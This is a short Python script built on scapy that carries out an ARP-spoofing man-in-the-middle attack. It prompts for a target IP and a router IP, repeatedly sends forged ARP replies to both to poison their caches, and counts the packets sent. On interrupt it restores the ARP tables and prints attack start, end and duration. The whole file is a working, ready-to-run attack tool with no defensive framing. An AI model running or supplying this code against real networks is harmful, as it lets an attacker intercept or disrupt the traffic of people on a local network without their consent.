import scapy.all as scapy
from datetime import datetime, timedelta

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answer_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answer_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = input("Enter target IP >>> ")
gateway_ip = input("Enter Router IP >>> ")

try:
    send_packet_count = 0
    start_time = datetime.now()
    #print("[+] Spoof boshlandi... CTRL+C bosib to'xtating")
    
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        send_packet_count += 2
        print(f"\r[+] Packets sent: {send_packet_count}", end="", flush=True)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL+C ...Resetting ARP tables...Please wait.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    
    end_time = datetime.now()
    duration = end_time - start_time
    print("\n[+] Work statistics:")
    print(f"    - Total ARP packets sent: {send_packet_count}")
    print(f"    - Attack start time: {start_time}")
    print(f"    - Attack end time: {end_time}")
    print(f"    - Attack duration: {duration}")
